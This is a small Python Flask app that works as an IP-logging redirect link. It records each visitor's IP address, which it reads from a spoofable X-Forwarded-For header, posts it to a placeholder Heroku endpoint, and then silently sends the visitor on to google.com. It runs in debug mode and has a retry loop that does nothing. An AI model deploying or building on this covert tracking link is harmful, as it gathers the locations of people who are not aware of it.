from flask import Flask, request, redirect
import requests
import time
from ipaddress import ip_address, ip_network

app = Flask(__name__)

@app.route('/')
def home():
    print("Accessed / route")
    return redirect('/redirect')

@app.route('/redirect', methods=['GET'])
def send_ip_and_redirect():
    client_ip = get_client_ip()
    print(f"Client IP: {client_ip}")

    target_server_url = "https://your-heroku-app.herokuapp.com/log_ip"
    payload = {"ip": client_ip}

    try:
        response = requests.post(target_server_url, json=payload)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending IP: {e}")

    target_url = "https://google.com"
    for attempt in range(1, 6):
        try:
            print(f"Attempt {attempt}: Redirecting to {target_url}")
            return redirect(target_url)
        except Exception as e:
            print(f"Redirect failed on attempt {attempt}: {e}")
            time.sleep(2)

    print("All redirect attempts failed.")
    return "Failed to redirect after multiple attempts.", 500

def get_client_ip():
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    if x_forwarded_for:
        return x_forwarded_for.split(',')[0].strip()
    return request.remote_addr

def is_private_ip(ip):
    private_ranges = [
        ip_network("10.0.0.0/8"),
        ip_network("172.16.0.0/12"),
        ip_network("192.168.0.0/16"),
        ip_network("127.0.0.0/8")
    ]
    ip_obj = ip_address(ip)
    return any(ip_obj in net for net in private_ranges)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
